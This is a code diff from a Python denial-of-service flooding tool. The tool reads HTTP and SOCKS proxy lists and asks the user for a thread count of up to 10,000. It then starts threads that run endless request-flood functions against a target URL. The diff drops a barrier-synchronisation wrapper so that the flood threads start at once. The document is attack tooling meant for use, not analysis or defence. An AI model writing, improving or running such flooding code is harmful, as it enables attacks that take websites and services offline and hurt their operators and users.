@@ -18,14 +18,6 @@ with open('proxyhttp') as file:
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 
-def dospause1(barrier, url):
-    barrier.wait()
-    dos1(url)
-
-def dospause2(barrier, url):
-    barrier.wait()
-    dos2(url)
-
 def dos1(target):
     while True:
         useragent = random.choice(headersp)
@@ -91,17 +83,16 @@ except ValueError:
 if threads == 0 or threads > 10000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
 if (proxyuseage == 1):
     for i in range(0, threads):
-        thr = threading.Thread(target=dospause1, args=(url,))
+        thr = threading.Thread(target=dos1, args=(url,))
         thr.start()
 else:
     for i in range(0, threads):
-        thr2 = threading.Thread(target=dospause2, args=(url,))
+        thr2 = threading.Thread(target=dos2, args=(url,))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
